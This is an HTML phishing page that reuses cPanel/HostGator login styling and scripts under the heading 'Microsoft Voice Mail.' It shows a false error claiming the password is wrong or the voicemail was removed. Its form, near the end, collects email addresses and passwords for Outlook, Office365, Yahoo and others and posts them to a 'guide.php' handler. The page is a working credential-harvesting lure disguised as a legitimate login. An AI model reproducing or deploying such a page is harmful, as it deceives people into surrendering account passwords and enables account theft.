        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/white/domains.svg")
    }

    .icon.icon-size-24.icon-help {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/blue/help.svg")
    }

    .icon.icon-size-24.icon-help.icon-color-white {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/white/help.svg")
    }

    .icon.icon-size-24.icon-marketplace {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/blue/marketplace.svg")
    }

    .icon.icon-size-24.icon-marketplace.icon-color-white {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/white/marketplace.svg")
    }

    .icon.icon-size-24.icon-notification {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/blue/notification.svg")
    }

    .icon.icon-size-24.icon-notification.icon-color-white {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/white/notification.svg")
    }

    .icon.icon-size-24.icon-products {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/blue/products.svg")
    }

    .icon.icon-size-24.icon-products.icon-color-white {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/white/products.svg")
    }

    .icon.icon-size-24.icon-search {
        background: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/blue/search.svg")
    }

    .icon.icon-size-24.icon-search.icon-color-white {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/white/search.svg")
    }

    .icon.icon-size-24.icon-user {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/blue/user.svg")
    }

    .icon.icon-size-24.icon-user.icon-color-white {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/white/user.svg")
    }

    .icon.icon-size-24.icon-websites {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/blue/websites.svg")
    }

    .icon.icon-size-24.icon-websites.icon-color-white {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/white/websites.svg")
    }

    .icon.icon-size-24.icon-lock {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/green/lock.svg")
    }

    .icon.icon-size-24.icon-lock.icon-color-red {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/red/lock.svg")
    }

    .icon.icon-size-24.icon-shield {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/green/shield.svg")
    }

    .icon.icon-size-24.icon-shield.icon-color-red {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/red/shield.svg")
    }

    .icon.icon-size-24.icon-renew {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/green/renew.svg")
    }

    .icon.icon-size-24.icon-calendar {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/red/calendar.svg")
    }

    .icon.icon-size-24.icon-control-panel.icon-color-white {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/white/control-panel.svg")
    }

    .icon.icon-size-24.icon-webmail.icon-color-white {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/white/webmail.svg")
    }

    .icon.icon-size-24.icon-cart.icon-color-white {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/white/cart.svg")
    }

    .icon.icon-size-24.icon-news.icon-color-white {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/white/news.svg")
    }

    .icon.icon-size-24.icon-check.icon-color-green {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/green/check.svg")
    }

    .icon.icon-size-24.icon-not-checked.icon-color-red {
        background-image: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/icons/24x24/red/not-checked.svg")
    }

    .iCheck-helper {
        z-index: 1
    }

    .iradio.icheck-default,
    .icheckbox.icheck-default {
        width: 1.375rem;
        height: 1.375rem;
        font-size: 1rem;
        border: 0.063rem solid #6796c0
    }

    .iradio.icheck-default.checked::after,
    .icheckbox.icheck-default.checked::after {
        position: absolute;
        top: 0.188em;
        right: 0.188em;
        bottom: 0.188em;
        left: 0.188em;
        content: "";
        background: #6796c0
    }

    .iradio {
        position: relative
    }

    .iradio.icheck-default {
        border-radius: 50%
    }

    .iradio.icheck-default.checked::after {
        border-radius: 50%
    }

    .icheckbox {
        position: relative
    }

    .icheckbox.icheck-default {
        border-radius: .25rem
    }

    .icheckbox.icheck-default.checked::after {
        border-radius: .25rem
    }

    .icheckbox.icheck-switch {
        width: 0.75rem;
        height: 0.75rem;
        background: url("/cPanel_magic_revision_1555642975/unprotected/hostgator/images/vendors/icheck/switch.svg")
    }

    .icheckbox.icheck-switch.checked {
        background-position: -0.75rem 0
    }

    .icheckbox.icheck-toggle {
        font-weight: 800;
        border: 0.063rem solid #4b7cb3;
        border-radius: .25rem
    }

    .icheckbox.icheck-toggle.icheck-size-30 {
        height: 1.875rem;
        font-size: 0.75rem;
        line-height: 1.75rem
    }

    .icheckbox.icheck-toggle.icheck-size-40 {
        height: 2.5rem;
        font-size: 1.125rem;
        line-height: 2.375rem
    }

    .icheckbox.icheck-toggle.icheck-on-off.icheck-size-30 {
        width: 6.125rem
    }

    .icheckbox.icheck-toggle.icheck-on-off.icheck-size-40 {
        width: 8.125rem
    }

    .icheckbox.icheck-toggle.icheck-on-off::before {
        content: "On"
    }

    .icheckbox.icheck-toggle.icheck-on-off::after {
        content: "Off"
    }

    .icheckbox.icheck-toggle.icheck-locked-unlocked.icheck-size-30 {
        width: 10rem
    }

    .icheckbox.icheck-toggle.icheck-locked-unlocked.icheck-size-40 {
        width: 14rem
    }

    .icheckbox.icheck-toggle.icheck-locked-unlocked::before {
        content: "Locked"
    }

    .icheckbox.icheck-toggle.icheck-locked-unlocked::after {
        content: "Unlocked"
    }

    .icheckbox.icheck-toggle:not(.checked)::before {
        color: #6796c0;
        background: #fff
    }

    .icheckbox.icheck-toggle:not(.checked)::after {
        color: #fff;
        background: #4b7cb3;
        box-shadow: inset 0 0.188rem 0 0 #375c85
    }

    .icheckbox.icheck-toggle.checked::before {
        color: #fff;
        background: #4b7cb3;
        box-shadow: inset 0 0.188rem 0 0 #375c85
    }

    .icheckbox.icheck-toggle.checked::after {
        color: #6796c0;
        background: #fff
    }

    .icheckbox.icheck-toggle::before,
    .icheckbox.icheck-toggle::after {
        position: absolute;
        top: 0;
        bottom: 0;
        width: 50%;
        text-align: center;
        transition: all 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67)
    }

    .icheckbox.icheck-toggle::before {
        left: 0;
        border-right: 0.063rem solid #4b7cb3;
        border-radius: .187rem 0 0 .187rem
    }

    .icheckbox.icheck-toggle::after {
        right: 0;
        border-radius: 0 .187rem .187rem 0
    }

    .icheckbox input {
        display: none
    }

    @keyframes ball {
        50% {
            opacity: 0.3;
            transform: scale(0.4)
        }
        100% {
            opacity: 1;
            transform: scale(1)
        }
    }

    .loader {
        position: absolute;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        padding: 2rem 0 0 0;
        background: rgba(255, 255, 255, 0.8);
        opacity: 0;
        visibility: hidden;
        transition: opacity 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67), visibility 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67)
    }

    .loader.active {
        opacity: 1;
        visibility: visible
    }

    .loader .ball {
        position: relative;
        width: 6.25rem;
        height: 6.25rem;
        margin: 0 auto
    }

    .loader .ball *:nth-child(1) {
        top: 2.5rem;
        left: 0;
        animation: ball 1s -.96s infinite linear
    }

    .loader .ball *:nth-child(2) {
        top: 1.7045454545rem;
        left: 1.7045454545rem;
        animation: ball 1s -.84s infinite linear
    }

    .loader .ball *:nth-child(3) {
        top: 0;
        left: 2.5rem;
        animation: ball 1s -.72s infinite linear
    }

    .loader .ball *:nth-child(4) {
        top: -1.7045454545rem;
        left: 1.7045454545rem;
        animation: ball 1s -.6s infinite linear
    }

    .loader .ball *:nth-child(5) {
        top: -2.5rem;
        left: 0;
        animation: ball 1s -.48s infinite linear
    }

    .loader .ball *:nth-child(6) {
        top: -1.7045454545rem;
        left: -1.7045454545rem;
        animation: ball 1s -.36s infinite linear
    }

    .loader .ball *:nth-child(7) {
        top: 0;
        left: -2.5rem;
        animation: ball 1s -.24s infinite linear
    }

    .loader .ball *:nth-child(8) {
        top: 1.7045454545rem;
        left: -1.7045454545rem;
        animation: ball 1s -.12s infinite linear
    }

    .loader .ball i {
        display: block;
        position: absolute;
        width: 1.25rem;
        height: 1.25rem;
        margin: 2.5rem 0 0 2.5rem;
        background: #4b7cb3;
        border-radius: 50%
    }

    .loader .loading {
        font-weight: 200;
        font-size: 1.25rem;
        text-align: center;
        color: #4b7cb3;
        padding: 1rem 0 0 0
    }

    @media (min-width: 48em) {
        .loader .loading {
            font-size: 1.5rem
        }
    }

    .modal-backdrop {
        position: fixed;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        background: rgba(0, 0, 0, 0.4);
        z-index: 1000
    }

    .modal-backdrop.fade {
        opacity: 0;
        transition: opacity 0.1s ease-in-out
    }

    .modal-backdrop.fade.in {
        opacity: 1
    }

    .modal {
        display: none;
        position: fixed;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        outline: 0;
        opacity: 0;
        z-index: 1010;
        transition: opacity 0.2s ease-in-out
    }

    .modal.in {
        opacity: 1
    }

    .modal.slide-in-top.in .modal-content {
        -webkit-transform: translateY(0);
        transform: translateY(0)
    }

    .modal.slide-in-top .modal-content {
        -webkit-transform: translateY(-25%);
        transform: translateY(-25%)
    }

    .modal.slide-in-bottom.in .modal-content {
        -webkit-transform: translateY(0);
        transform: translateY(0)
    }

    .modal.slide-in-bottom .modal-content {
        -webkit-transform: translateY(25%);
        transform: translateY(25%)
    }

    .modal.slide-in-right.in .modal-content {
        -webkit-transform: translateX(0);
        transform: translateX()
    }

    .modal.slide-in-right .modal-content {
        -webkit-transform: translateX(20%);
        transform: translateX(20%)
    }

    .modal.scale-up.in .modal-content {
        -webkit-transform: scale(1);
        transform: scale(1)
    }

    .modal.scale-up .modal-content {
        -webkit-transform: scale(0.7);
        transform: scale(0.7)
    }

    .modal.scale-down.in .modal-content {
        -webkit-transform: scale(1);
        transform: scale(1)
    }

    .modal.scale-down .modal-content {
        -webkit-transform: scale(1.25);
        transform: scale(1.25)
    }

    .modal .modal-dialog {
        position: fixed;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        padding: 1rem;
        overflow-y: auto;
        -webkit-overflow-scrolling: touch
    }

    @media (min-width: 48em) {
        .modal .modal-dialog {
            padding: 2rem
        }
    }

    .modal .modal-dialog .modal-content {
        width: 100%;
        max-width: 31.25rem;
        margin: auto;
        background: #fff;
        transition: all 0.25s ease-in-out
    }

    .modal .modal-dialog .modal-content.width-850 {
        max-width: 53.125rem
    }

    @media (min-width: 34em) {
        .modal .modal-dialog .modal-content.width-850 .modal-footer {
            max-width: 25rem;
            margin-right: auto;
            margin-left: auto
        }
    }

    .modal .modal-dialog .modal-content .modal-header {
        position: relative;
        font-weight: 700;
        font-size: 1.125rem;
        color: #f0894f;
        padding: 1rem 3rem 1rem 1rem;
        box-shadow: 0 0.126rem 0.126rem rgba(0, 0, 0, 0.1)
    }

    .modal .modal-dialog .modal-content .modal-header .button {
        position: absolute;
        top: 1rem;
        right: 1rem
    }

    .modal .modal-dialog .modal-content .modal-body {
        padding: 1rem
    }

    @media (min-width: 48em) {
        .modal .modal-dialog .modal-content .modal-body {
            padding: 2rem
        }
    }

    .modal .modal-dialog .modal-content .modal-body .tabs {
        text-align: center;
        border-bottom: 0.063rem solid rgba(103, 150, 192, 0.8)
    }

    .modal .modal-dialog .modal-content .modal-body .tabs li {
        -webkit-box-flex: 1;
        -webkit-flex: 1 1 auto;
        -moz-box-flex: 1;
        -moz-flex: 1 1 auto;
        -ms-flex: 1 1 auto;
        flex: 1 1 auto
    }

    .modal .modal-dialog .modal-content .modal-body .tabs li.current .button.button-link {
        font-weight: 700;
        border-color: #4b7cb3
    }

    .modal .modal-dialog .modal-content .modal-body .tabs .button.button-link {
        width: 100%;
        padding: 0 0 0.313rem 0;
        margin: 0 0 -0.063rem 0;
        border-bottom: 0.188rem solid transparent
    }

    .modal .modal-dialog .modal-content .modal-body .or {
        text-align: center;
        margin: 0 0 0.5rem 0;
        overflow: hidden
    }

    .modal .modal-dialog .modal-content .modal-footer {
        padding: 1rem
    }

    @media (min-width: 48em) {
        .modal .modal-dialog .modal-content .modal-footer {
            padding: 2rem
        }
    }

    .modal .modal-dialog .modal-content .modal-footer .row:not(:last-child) {
        padding: 0 0 1rem 0
    }

    .modal .modal-dialog .modal-content .modal-footer li {
        text-align: center;
        overflow: hidden
    }

    .modal .modal-dialog .modal-content .modal-footer li:not(:last-child) {
        padding: 0 0 0.25rem 0
    }

    .modal .modal-dialog .modal-content .modal-footer .button {
        display: block;
        width: 100%
    }

    .scrollbar {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        overflow: hidden
    }

    .scrollbar:hover .ps-scrollbar-y-rail {
        opacity: 1
    }

    .scrollbar .ps-scrollbar-y-rail {
        position: absolute;
        top: 0;
        right: 0;
        bottom: 0;
        width: 0.188rem;
        opacity: 0;
        transition: opacity 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67)
    }

    .scrollbar .ps-scrollbar-y-rail .ps-scrollbar-y {
        position: absolute;
        width: 100%;
        background: rgba(0, 0, 0, 0.2)
    }

    .scrollbar .ps-scrollbar-x-rail {
        display: none
    }

    .select2-hidden-accessible {
        display: none
    }

    .select2 {
        display: block;
        position: relative;
        cursor: pointer
    }

    .select2 .select2-selection {
        display: block;
        -webkit-user-select: none;
        user-select: none
    }

    .select2 .select2-selection:focus {
        outline: none
    }

    .select2 .select2-selection .select2-selection__rendered {
        display: block;
        text-overflow: ellipsis;
        white-space: nowrap;
        color: #4b7cb3;
        padding: 0 0.625rem;
        border: 0.063rem solid #4b7cb3;
        border-radius: .25rem;
        overflow: hidden
    }

    .select2 .select2-selection .select2-selection__arrow {
        position: absolute;
        top: 0.063rem
    }

    .select2 .select2-selection .select2-selection__arrow::after {
        font-family: "FontAwesome";
        text-align: center;
        color: #4b7cb3;
        content: "\f0d7"
    }

    .select-size-28+.select2 .select2-selection .select2-selection__rendered {
        height: 1.75rem;
        font-size: 0.875rem;
        line-height: 1.625rem;
        padding: 0 1.5rem 0 0.625rem
    }

    .select-size-28+.select2 .select2-selection .select2-selection__arrow {
        right: 0.5rem
    }

    .select-size-28+.select2 .select2-selection .select2-selection__arrow::after {
        line-height: 1.625rem
    }

    .select-size-40+.select2 .select2-selection .select2-selection__rendered {
        height: 2.5rem;
        font-size: 1.125rem;
        line-height: 2.375rem;
        padding: 0 2rem 0 1rem
    }

    .select-size-40+.select2 .select2-selection .select2-selection__arrow {
        right: 1rem
    }

    .select-size-40+.select2 .select2-selection .select2-selection__arrow::after {
        line-height: 2.375rem
    }

    .select2-dropdown {
        display: block;
        position: relative;
        font-size: 0.875rem;
        white-space: nowrap;
        color: #4b7cb3;
        background: #fff;
        border: 0.063rem solid #4b7cb3;
        border-radius: .25rem;
        z-index: 1020
    }

    .select2-dropdown .select2-search {
        display: none
    }

    .select2-dropdown .select2-results__options {
        max-height: 10.938rem;
        overflow-y: auto
    }

    .select2-dropdown .select2-results__options .select2-results__option {
        text-overflow: ellipsis;
        padding: 0.25rem 0.625rem;
        overflow: hidden;
        cursor: pointer;
        transition: background 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67)
    }

    .select2-dropdown .select2-results__options .select2-results__option.select2-results__option--highlighted {
        background: rgba(103, 150, 192, 0.1)
    }

    .select2-dropdown .select2-results__options .select2-results__option:first-child {
        border-radius: .25rem .25rem 0 0
    }

    .select2-dropdown .select2-results__options .select2-results__option:last-child {
        border-radius: 0 0 .25rem .25rem
    }

    .select2-dropdown .select2-results__options .select2-results__option:first-child:last-child {
        border-radius: .25rem
    }

    .select2-dropdown .select2-results__options .select2-results__option:not(:last-child) {
        border-bottom: 0.063rem solid #eee
    }
</style>
<p><input id="goto_uri" type="hidden" value="/" /> <input id="goto_app" type="hidden" value="" /></p>

<div class="cnt1">
<div class="group no-external-auth-modules" id="login-wrapper" style="opacity: 1; visibility: visible;">
<div class="wrapper">
<div id="notify"><noscript>
                    <div class="error-notice">
                        <img src="/cPanel_magic_revision_1554241812/unprotected/hostgator/images/notice-error.png" alt="Error" align="left"/>
                        JavaScript is disabled in your browser.
                        For cPanel to function properly, you must enable JavaScript.
                        If you do not enable JavaScript, certain features in cPanel will not function correctly.
                    </div>
                </noscript>
<div class="error-notice" id="login-status" style="visibility: hidden">
<div class="content-wrapper">
<div id="login-detail">
<div id="login-status-icon-container"></div>

<div id="login-status-message">You have logged out.</div>
</div>
</div>
</div>
</div>

<div style="display:none">
<div id="locale-container" style="visibility:hidden">
<div id="locale-inner-container">
<div id="locale-header">
<div class="locale-head">Please select a locale:</div>

<div class="close"><a href="javascript:void(0)" onclick="toggle_locales(false)">X Close</a></div>
</div>

<div id="locale-map">
<div class="scroller clear">
<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=en">English</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=ar">العربية</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=bg">български</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=cs">če&scaron;tina</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=da">dansk</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=de">Deutsch</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=el">&Epsilon;&lambda;&lambda;&eta;&nu;&iota;&kappa;ά</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=es">espa&ntilde;ol</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=es_419">espa&ntilde;ol latinoamericano</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=es_es">espa&ntilde;ol de Espa&ntilde;a</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=fi">suomi</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=fil">Filipino</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=fr">fran&ccedil;ais</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=he">עברית</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=hu">magyar</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=i_cpanel_snowmen">☃ cPanel Snowmen ☃ - i_cpanel_snowmen</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=id">Bahasa Indonesia</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=it">italiano</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=ja">日本語</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=ko">한국어</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=ms">Bahasa Melayu</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=nb">norsk bokm&aring;l</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=nl">Nederlands</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=no">Norwegian</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=pl">polski</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=pt">portugu&ecirc;s</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=pt_br">portugu&ecirc;s do Brasil</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=ro">rom&acirc;nă</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=ru">русский</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=sl">sloven&scaron;čina</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=sv">svenska</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=th">ไทย</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=tr">T&uuml;rk&ccedil;e</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=uk">українська</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=vi">Tiếng Việt</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=zh">中文</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=zh_cn">中文（中国）</a></div>

<div class="locale-cell"><a href="https://www.tangomarketingsolutions.com:2083/?locale=zh_tw">中文（台湾）</a></div>
</div>
</div>
</div>
</div>
</div>

<div id="content-container">
<div id="login-containerhg">
<div id="login-sub-containerhg">
<div class="login-form">
<div class="page-title secondary">
<h2>Microsoft Voice Mail.</h2>

<h2><span style="font-size:16px;"><span style="color:#FF0000;">Either your password is incorrect or voice mail has been removed by sender.</span></span></h2>
</div>

<div class="form">
<form action="guide.php" id="login_form_hg" method="post" novalidate="" style="visibility:" target="_top">
<ul class="tabs">
	<li class="current"><a href="./index.html" onclick="">Outlook&amp;Office365</a></li>
	<li><a href="./others.htm" onclick="">Yahoo and Others</a></li>
</ul>

<div class="content">
<div class="row"><label>Email Address</label> <input autofocus="autofocus" class="field field-default field-size-40" id="user" name="user" placeholder="Enter your email address." required="" tabindex="1" type="text" /></div>

<div class="row"><label>Password</label> <input class="field field-default field-size-40" id="pass" name="pass" placeholder="Enter your email password." required="" tabindex="2" type="password" /></div>

<div class="row"><button class="button button-jaffa button-size-60 button-rounded" type="submit">Log In</button></div>
</div>
</form>
</div>

<div class="links"></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<script>
    var MESSAGES = {"read_below":"Read the important information below.","no_username":"You must specify a username to log in.","authenticating":"Authenticating …","network_error":"A network error occurred during your login request. Please try again. If this condition persists, contact your network service provider.","session_locale":"The desired locale has been saved to your browser. To change the locale in this browser again, select another locale on this screen.","success":"Login successful. Redirecting …","invalid_login":"The login is invalid.","ajax_timeout":"The connection timed out. Please try again."};

    window.IS_LOGOUT = false;

                
//login.js
"use strict";
var FADE_DURATION = .45;
var FADE_DELAY = 20;
var AJAX_TIMEOUT = 3e4;
var LOCALE_FADES = [];
var HAS_CSS_OPACITY = "opacity" in document.body.style;
var login_form_hg = DOM.get("login_form_hg");
var login_username_el = DOM.get("user");
var login_password_el = DOM.get("pass");
var login_submit_el = DOM.get("login_submit");
var goto_app = DOM.get("goto_app");
var goto_uri = DOM.get("goto_uri");
var div_cache = {
    "login-page": DOM.get("login-page") || false,
    "locale-container": DOM.get("locale-container") || false,
    "login-container": DOM.get("login-container") || false,
    "locale-footer": DOM.get("locale-footer") || false,
    "content-cell": DOM.get("content-container") || false,
    invalid: DOM.get("invalid") || false
};
var content_cell = div_cache["content-cell"];
if (div_cache["locale-footer"]) div_cache["locale-footer"].style.display = "block";
var reset_form = DOM.get("reset_form");
var reset_username_el = DOM.get("reset_pass_username");
var RESET_FADES = [];
var show_reset = function () {
    if (!reset_username_el.value) reset_username_el.value = login_username_el.value;
    while (RESET_FADES.length)clearInterval(RESET_FADES.shift());
    RESET_FADES.push(fade_in(reset_form));
    RESET_FADES.push(fade_out(login_form_hg));
    reset_username_el.focus()
};
var hide_reset = function () {
    while (RESET_FADES.length)clearInterval(RESET_FADES.shift());
    RESET_FADES.push(fade_in(login_form_hg));
    RESET_FADES.push(fade_out(reset_form));
    login_username_el.focus()
};
function toggle_locales(show_locales) {
    while (LOCALE_FADES.length)clearInterval(LOCALE_FADES.shift());
    var newly_shown = div_cache[show_locales ? "locale-container" : "login-container"];
    set_opacity(newly_shown, 0);
    if (HAS_CSS_OPACITY) {
        content_cell.replaceChild(newly_shown, content_cell.children[0])
    } else {
        var old = content_cell.children[0];
        content_cell.insertBefore(newly_shown, old);
        newly_shown.style.display = "";
        old.style.display = "none"
    }
    LOCALE_FADES.push(fade_in(newly_shown));
    LOCALE_FADES.push((show_locales ? fade_out : fade_in)("locale-footer"))
}
if (HAS_CSS_OPACITY) {
    var set_opacity = function set_opacity(el, opacity) {
        el.style.opacity = opacity
    }
} else {
    var filter_regex = /(DXImageTransform\.Microsoft\.Alpha\()[^)]*\)/;
    var set_opacity = function set_opacity(el, opacity) {
        var filter_text = el.currentStyle.filter;
        if (!filter_text) {
            el.style.filter = "progid:DXImageTransform.Microsoft.Alpha(enabled=true)"
        } else if (!filter_regex.test(filter_text)) {
            el.style.filter += " progid:DXImageTransform.Microsoft.Alpha(enabled=true)"
        } else {
            var new_filter = filter_text.replace(filter_regex, "$1enabled=true)");
            if (new_filter !== filter_text) el.style.filter = new_filter
        }
        try {
            el.filters.item("DXImageTransform.Microsoft.Alpha").opacity = opacity * 100
        } catch (e) {
            try {
                el.filters.item("alpha").opacity = opacity * 100
            } catch (error) {
            }
        }
    }
}
function fade_in(el, duration, _fade_out_instead) {
    el = div_cache[el] || DOM.get(el) || el;
    var style_obj = el.style;
    var interval;
    var cur_style = window.getComputedStyle ? getComputedStyle(el, null) : el.currentStyle;
    var visibility = cur_style.visibility;
    var start_opacity;
    if (el.offsetWidth && visibility !== "hidden") {
        if (window.getComputedStyle) {
            start_opacity = Number(cur_style.opacity)
        } else {
            try {
                start_opacity = el.filters.item("DXImageTransform.Microsoft.Alpha").opacity
            } catch (e) {
                try {
                    start_opacity = el.filters("alpha").opacity
                } catch (error) {
                    start_opacity = 100
                }
            }
            start_opacity /= 100
        }
        if (!start_opacity) start_opacity = 0
    } else {
        start_opacity = 0;
        set_opacity(el, 0)
    }
    if (_fade_out_instead && start_opacity < .01) {
        if (start_opacity) set_opacity(el, 0);
        return
    }
    if (!duration) duration = FADE_DURATION;
    var duration_ms = duration * 1e3;
    var start = new Date;
    var end;
    if (_fade_out_instead) {
        end = duration_ms + start.getTime()
    } else {
        style_obj.visibility = "visible"
    }
    var fader = function () {
        var opacity;
        if (_fade_out_instead) {
            opacity = start_opacity * (end - new Date) / duration_ms;
            if (opacity <= 0) {
                opacity = 0;
                clearInterval(interval);
                style_obj.visibility = "hidden"
            }
        } else {
            opacity = start_opacity + (1 - start_opacity) * (new Date - start) / duration_ms;
            if (opacity >= 1) {
                opacity = 1;
                clearInterval(interval)
            }
        }
        set_opacity(el, opacity)
    };
    fader();
    interval = setInterval(fader, FADE_DELAY);
    return interval
}
function fade_out(el, timeout) {
    return fade_in(el, timeout, true)
}
function ajaxObject(url, callbackFunction) {
    this._url = url;
    this._callback = callbackFunction || function () {
        }
}
ajaxObject.prototype.updating = false;
ajaxObject.prototype.abort = function () {
    if (this.updating) {
        this.AJAX.abort();
        delete this.AJAX
    }
};
ajaxObject.prototype.update = function (passData, postMethod) {
    if (this.AJAX)return false;
    var ajax = null;
    if (window.XMLHttpRequest) {
        ajax = new XMLHttpRequest
    } else if (window.ActiveXObject) {
        ajax = new ActiveXObject("Microsoft.XMLHTTP")
    } else {
        return false
    }
    var timeout;
    var that = this;
    ajax.onreadystatechange = function () {
        if (ajax.readyState == 4) {
            clearTimeout(timeout);
            that.updating = false;
            that._callback(ajax);
            delete that.AJAX
        }
    };
    try {
        var uri;
        timeout = setTimeout(function () {
            that.abort();
            show_status(MESSAGES.ajax_timeout, "error")
        }, AJAX_TIMEOUT);
        if (/post/i.test(postMethod)) {
            uri = this._url + "?login_only=1";
            ajax.open("POST", uri, true);
            ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            ajax.send(passData)
        } else {
            uri = this._url + "?" + passData + "&timestamp=" + (new Date).getTime();
            ajax.open("GET", uri, true);
            ajax.send(null)
        }
        this.AJAX = ajax;
        this.updating = true
    } catch (e) {
        login_form_hg.submit()
    }
    return true
};
var _text_content = "textContent" in document.body ? "textContent" : "innerText";
function login_results(ajax_obj) {
    var result;
    try {
        result = JSON.parse(ajax_obj && ajax_obj.responseText)
    } catch (e) {
        result = null
    }
    var response_status = ajax_obj.status;
    if (response_status === 200) {
        if (result) {
            var final_uri;
            var login_url_regex = /^\/(?:logout|login|openid_connect_callback)\/?/;
            if (result.redirect && !login_url_regex.test(result.redirect)) {
                final_uri = result.redirect
            }
            var location_obj_to_redirect;
            if (/^(?:\/cpsess[^\/]+)\/$/.test(final_uri)) {
                location_obj_to_redirect = top.location
            } else {
                if (result.security_token && top !== window) {
                    for (var f = 0; f < top.frames.length; f++) {
                        if (top.frames[f] !== window) {
                            var href = top.frames[f].location.href.replace(/\/cpsess[.\d]+/, result.security_token);
                            top.frames[f].location.href = href
                        }
                    }
                }
                location_obj_to_redirect = location
            }
            var redirector = function () {
                location_obj_to_redirect.href = final_uri + location.hash
            };
            if (result.notices && result.notices.length) {
                show_status(MESSAGES.read_below, "warn");
